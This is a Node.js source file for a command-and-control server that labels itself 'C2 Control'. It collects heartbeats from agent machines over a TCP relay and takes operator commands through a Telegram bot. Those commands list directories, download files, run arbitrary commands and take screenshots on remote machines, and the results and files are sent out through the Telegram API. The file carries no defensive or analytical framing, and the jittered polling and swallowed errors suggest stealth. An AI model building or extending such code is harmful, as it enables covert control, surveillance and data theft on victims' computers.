const net = require('net');
const https = require('https');
const cfg = require('./config');
const registry = require('./registry');
const agent = require('./agent');

let tcpRelay = null;
let httpRelay = null;
let telegramPoller = null;

function startTCPRelay() {
  tcpRelay = net.createServer((socket) => {
    let buf = '';
    socket.on('data', (d) => {
      buf += d.toString();
      const lines = buf.split('\n');
      buf = lines.pop();
      for (const line of lines) {
        if (!line.trim()) continue;
        try {
          const msg = JSON.parse(line);
          handleAgentMessage(socket, msg);
        } catch(e) {}
      }
    });
    socket.on('close', () => {});
    socket.on('error', () => {});
  });

  tcpRelay.listen(cfg.RELAY_PORT, '0.0.0.0', () => {});
}

function handleAgentMessage(socket, msg) {
  switch (msg.type) {
    case 'heartbeat':
      registry.upsert(msg.id, {
        hostname: msg.hostname,
        ip: msg.ip,
        drives: msg.drives,
        os: msg.os,
        uptime: msg.uptime,
        arch: msg.arch,
        socket,
      });
      break;

    case 'cmdResult': {
      const pending = pendingReplies.get(msg.replyId);
      if (pending) {
        pending.resolve(msg.data);
        pendingReplies.delete(msg.replyId);
      }
      break;
    }

    case 'offline':
      registry.remove(msg.id);
      break;
  }
}

const pendingReplies = new Map();
let replyCounter = 0;

function sendCommand(targetId, cmd, args) {
  return new Promise((resolve) => {
    const machine = registry.get(targetId);
    if (!machine || !machine.socket || !machine.socket.writable) {
      return resolve(`Error: Machine ${targetId} not connected`);
    }
    const replyId = ++replyCounter;
    pendingReplies.set(replyId, { resolve, time: Date.now() });
    const packet = JSON.stringify({ target: targetId, cmd, args, replyId }) + '\n';
    machine.socket.write(packet);
    setTimeout(() => {
      if (pendingReplies.has(replyId)) {
        pendingReplies.delete(replyId);
        resolve('Error: Command timed out');
      }
    }, 30000);
  });
}

function sendTelegram(text) {
  const data = JSON.stringify({ chat_id: cfg.TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' });
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${cfg.TELEGRAM_TOKEN}/sendMessage`,
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
  });
  req.write(data);
  req.end();
}

function sendFileToTelegram(filePath) {
  const Boundary = '----' + Date.now().toString(36);
  const info = require('fs').statSync(filePath);
  const bufs = [];
  bufs.push(Buffer.from('--' + Boundary + '\r\n'));
  bufs.push(Buffer.from(`Content-Disposition: form-data; name="document"; filename="${require('path').basename(filePath)}"\r\n`));
  bufs.push(Buffer.from('Content-Type: application/octet-stream\r\n\r\n'));
  bufs.push(require('fs').readFileSync(filePath));
  bufs.push(Buffer.from('\r\n--' + Boundary + '--\r\n'));

  const body = Buffer.concat(bufs);
  const req = https.request({
    hostname: 'api.telegram.org',
    path: `/bot${cfg.TELEGRAM_TOKEN}/sendDocument?chat_id=${cfg.TELEGRAM_CHAT_ID}`,
    method: 'POST',
    headers: {
      'Content-Type': `multipart/form-data; boundary=${Boundary}`,
      'Content-Length': body.length,
    },
  });
  req.write(body);
  req.end();
}

function startTelegramPoller() {
  let offset = 0;
  const poll = () => {
    const req = https.get(`https://api.telegram.org/bot${cfg.TELEGRAM_TOKEN}/getUpdates?offset=${offset}&timeout=30`, (res) => {
      let body = '';
      res.on('data', c => body += c);
      res.on('end', () => {
        try {
          const data = JSON.parse(body);
          if (!data.ok || !data.result) return;
          for (const update of data.result) {
            offset = update.update_id + 1;
            handleTelegramUpdate(update);
          }
        } catch(e) {}
      });
    });
    req.on('error', () => {});
    req.end();
    const jitter = Math.floor(Math.random() * 15000);
    telegramPoller = setTimeout(poll, cfg.TELEGRAM_POLL_INTERVAL + jitter);
  };
  telegramPoller = setTimeout(poll, cfg.TELEGRAM_POLL_INTERVAL);
}

function handleTelegramUpdate(update) {
  const msg = update.message || update.edited_message;
  if (!msg || !msg.text) return;
  const text = msg.text.trim();
  const chatId = msg.chat.id;
  cfg.TELEGRAM_CHAT_ID = chatId;

  const parts = text.split(/\s+/);
  const cmd = parts[0].toLowerCase();

  switch (cmd) {
    case '/status': {
      const online = registry.online();
      const offline = registry.offline();
      let resp = '*Machine Registry*\n\n';
      resp += `*Online (${online.length})*\n`;
      for (const m of online) {
        resp += `  \u{1F7E2} ${m.hostname} (${m.id})\n`;
        resp += `    IP: \`${m.ip}\`\n`;
        if (m.drives && m.drives.length) {
          resp += `    Drives: ${m.drives.map(d => `${d.drive} (${d.free}GB/${d.total}GB free)`).join(', ')}\n`;
        }
        resp += `    Uptime: ${m.uptime}h\n`;
      }
      if (offline.length) {
        resp += `\n*Offline (${offline.length})*\n`;
        for (const m of offline) {
          resp += `  \u{1F534} ${m.hostname} (${m.id})\n`;
        }
      }
      sendTelegram(resp);
      break;
    }

    case '/ls': {
      const target = parts[1];
      const dir = parts.slice(2).join(' ') || 'C:\\';
      if (!target) { sendTelegram('Usage: /ls [machine] [path]'); break; }
      sendCommand(target, 'ls', dir).then(res => {
        sendTelegram(`*${target}:* \`${dir}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
      });
      break;
    }

    case '/dl': {
      const target = parts[1];
      const filePath = parts.slice(2).join(' ');
      if (!target || !filePath) { sendTelegram('Usage: /dl [machine] [filepath]'); break; }
      sendCommand(target, 'dl', filePath).then(() => {
        sendTelegram(`Download initiated for ${filePath} on ${target}`);
      });
      break;
    }

    case '/exec': {
      const target = parts[1];
      const command = parts.slice(2).join(' ');
      if (!target || !command) { sendTelegram('Usage: /exec [machine] [command]'); break; }
      sendCommand(target, 'exec', command).then(res => {
        sendTelegram(`*${target}:* \`${command}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
      });
      break;
    }

    case '/tree': {
      const target = parts[1];
      const dir = parts.slice(2).join(' ') || 'C:\\';
      if (!target) { sendTelegram('Usage: /tree [machine] [path]'); break; }
      sendCommand(target, 'tree', dir).then(res => {
        sendTelegram(`*${target}:* \`${dir}\`\n\`\`\`\n${res.slice(0, 3000)}\n\`\`\``);
      });
      break;
    }

    case '/screenshot': {
      const target = parts[1];
      if (!target) { sendTelegram('Usage: /screenshot [machine]'); break; }
      sendCommand(target, 'screenshot', '').then(res => {
        sendTelegram(`*${target}:* ${res}`);
      });
      break;
    }

    case '/start':
    case '/help':
      sendTelegram(
        '*C2 Control*\n\n' +
        '/status - Show all machines\n' +
        '/ls [machine] [path] - List directory\n' +
        '/dl [machine] [filepath] - Download file\n' +
        '/exec [machine] [command] - Run command\n' +
        '/tree [machine] [path] - Directory tree\n' +
        '/screenshot [machine] - Take screenshot\n\n' +
        'File explorer: `http://[IP]:8080` or `\\\\\\\\[IP]\\\\C$`'
      );
      break;
  }
}

function init(isCommander) {
  if (isCommander) {
    startTCPRelay();
    startTelegramPoller();
  }
}

module.exports = { init, sendCommand, sendTelegram, sendFileToTelegram, handleAgentMessage };
